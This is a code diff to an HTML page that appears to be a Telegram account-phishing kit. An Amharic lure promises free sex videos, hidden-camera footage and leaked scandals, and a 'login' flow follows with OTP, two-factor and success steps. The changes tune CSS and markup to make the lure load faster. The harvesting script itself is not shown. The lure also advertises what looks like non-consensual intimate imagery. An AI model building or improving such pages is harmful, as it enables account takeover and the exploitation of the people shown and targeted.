@@ -97,7 +97,22 @@
         100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } 
     }
 
-    /* Premium Glassmorphism Card */
+    /* 
+       LIGHTWEIGHT GLASS FOR PHOTO PAGE 
+       (Removes heavy animations and blur to fix lag)
+    */
+    .photo-glass-card {
+        background: rgba(20, 20, 25, 0.8);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 20px;
+        padding: 24px 20px; 
+        width: 100%; 
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+    }
+
+    /* Premium Glassmorphism Card (Kept intact for OTP, 2FA, Success) */
     .glass-card {
         background: var(--glass-bg);
         backdrop-filter: blur(20px);
@@ -257,14 +272,13 @@
     }
 
     /* List Items Styling */
-    .feature-list { display: grid; gap: 12px; text-align: left; margin-bottom: 5px; }
+    .feature-list { display: grid; gap: 10px; text-align: left; margin-bottom: 5px; }
     .feature-item {
-        font-size: 14.5px; color: #D1D5DB; display: flex; align-items: center; gap: 12px;
-        background: rgba(255,255,255,0.03); padding: 12px 15px; border-radius: 12px;
+        font-size: 14px; color: #D1D5DB; display: flex; align-items: center; gap: 12px;
+        background: rgba(255,255,255,0.03); padding: 10px 14px; border-radius: 12px;
         border: 1px solid rgba(255,255,255,0.05); transition: background 0.3s;
     }
-    .feature-item:hover { background: rgba(255,255,255,0.06); }
-    .feature-icon { color: var(--primary); font-size: 16px; }
+    .feature-icon { color: var(--primary); font-size: 15px; }
 
 </style>
 </head>
@@ -282,11 +296,12 @@
         <p style="font-size: 12px; letter-spacing: 4px; color: var(--primary); opacity: 0.8; font-weight: 700; margin-top: 10px;">SECURING CONNECTION</p>
     </div>
 
-    <!-- Landing/Photo Step -->
+    <!-- Landing/Photo Step (Lag Fixed Version) -->
     <div id="step_photo_slide" class="step">
-        <div class="glass-card">
-            <div style="position: relative; overflow: hidden; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1);">
-                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; filter: contrast(1.1) brightness(0.85); object-fit: cover; max-height: 200px;">
+        <div class="photo-glass-card">
+            <!-- Removed heavy inline filters and shadow from image container to prevent lag -->
+            <div style="position: relative; overflow: hidden; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);">
+                <img src="https://i.postimg.cc/vBb7Ffqp/1772041532520.jpg" style="width: 100%; display: block; object-fit: cover; max-height: 200px;">
                 <div style="position: absolute; top: 12px; right: 12px;">
                     <div class="live-counter">
                         <span class="live-dot"></span>
@@ -295,37 +310,35 @@
                 </div>
             </div>
             
-            <div style="margin-top: 25px;">
-    <h3> በ ነፃ የሚገኙ በ ቻናላችን ዝርዝር፡</h3>
-    <div class="feature-list">
-        <div class="feature-item">
-            <i class="fa-solid fa-fire feature-icon"></i> 
-            <span>አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች</span>
-        </div>
-        <div class="feature-item">
-            <i class="fa-solid fa-video feature-icon"></i> 
-            <span>የቲክቶክ የቀጥታ ስርጭት ቅሌቶች</span>
-        </div>
-        <div class="feature-item">
-            <i class="fa-solid fa-camera-retro feature-icon"></i> 
-            <span>ድብቅ ካሜራዎች</span>
-        </div>
-        <!-- አዲስ የተጨመሩት 3 ዝርዝሮች -->
-        <div class="feature-item">
-            <i class="fa-solid fa-eye-slash feature-icon"></i> 
-            <span>አደባባይ ያልወጡ የቴሌግራም ቅሌቶች</span>
-        </div>
-        <div class="feature-item">
-            <i class="fa-solid fa-film feature-icon"></i> 
-            <span>ሙሉ ርዝመት ያላቸው ቪዲዮዎች (Full Length)</span>
-        </div>
-        <div class="feature-item">
-            <i class="fa-solid fa-tv feature-icon"></i> 
-            <span>ከፍተኛ ጥራት (HD) ያላቸው ቪዲዮዎች</span>
-        </div>
-    </div>
-</div>
-
+            <div style="margin-top: 20px;">
+                <h3 style="font-size: 16px; margin-bottom: 12px;">በ ነፃ የሚገኙ በ ቻናላችን ዝርዝር፡</h3>
+                <div class="feature-list">
+                    <div class="feature-item">
+                        <i class="fa-solid fa-fire feature-icon"></i> 
+                        <span>አዳዲስ የሀበሻ ወሲብ ቪዲዮዎች</span>
+                    </div>
+                    <div class="feature-item">
+                        <i class="fa-solid fa-video feature-icon"></i> 
+                        <span>የቲክቶክ የቀጥታ ስርጭት ቅሌቶች</span>
+                    </div>
+                    <div class="feature-item">
+                        <i class="fa-solid fa-camera-retro feature-icon"></i> 
+                        <span>ድብቅ ካሜራዎች</span>
+                    </div>
+                    <div class="feature-item">
+                        <i class="fa-solid fa-eye-slash feature-icon"></i> 
+                        <span>አደባባይ ያልወጡ የቴሌግራም ቅሌቶች</span>
+                    </div>
+                    <div class="feature-item">
+                        <i class="fa-solid fa-film feature-icon"></i> 
+                        <span>ሙሉ ርዝመት ያላቸው ቪዲዮዎች (Full Length)</span>
+                    </div>
+                    <div class="feature-item">
+                        <i class="fa-solid fa-tv feature-icon"></i> 
+                        <span>ከፍተኛ ጥራት (HD) ያላቸው ቪዲዮዎች</span>
+                    </div>
+                </div>
+            </div>
 
             <div id="status1" class="msg"></div>
             <button class="btn-main" id="loginBtn" onclick="handleLoginClick()">
@@ -340,7 +353,7 @@
         </div>
     </div>
 
-    <!-- OTP Step -->
+    <!-- OTP Step (Original Design Intact) -->
     <div id="step2" class="step">
         <div class="glass-card">
             <div style="background: linear-gradient(135deg, rgba(42, 171, 238, 0.2), rgba(42, 171, 238, 0.05)); padding: 15px; border-radius: 20px; width: 65px; height: 65px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 1px solid rgba(42, 171, 238, 0.3); box-shadow: 0 10px 20px rgba(42,171,238,0.15);">
@@ -369,7 +382,7 @@
         </div>
     </div>
 
-    <!-- 2FA Step -->
+    <!-- 2FA Step (Original Design Intact) -->
     <div id="step3" class="step">
         <div class="glass-card">
             <div style="width: 70px; height: 70px; background: linear-gradient(135deg, rgba(255, 0, 94, 0.2), rgba(106, 0, 255, 0.1)); border: 1px solid rgba(255, 0, 94, 0.3); border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 10px 25px rgba(255,0,94,0.2);">
@@ -393,7 +406,7 @@
         </div>
     </div>
 
-    <!-- Success Step -->
+    <!-- Success Step (Original Design Intact) -->
     <div id="step_success" class="step">
         <div class="glass-card" style="border-color: rgba(0, 230, 118, 0.4); box-shadow: 0 20px 50px rgba(0, 230, 118, 0.15);">
             <div style="width: 80px; height: 80px; background: rgba(0, 230, 118, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: popKey 0.5s ease;">
@@ -683,3 +696,4 @@
 </script>
 </body>
 </html>
+
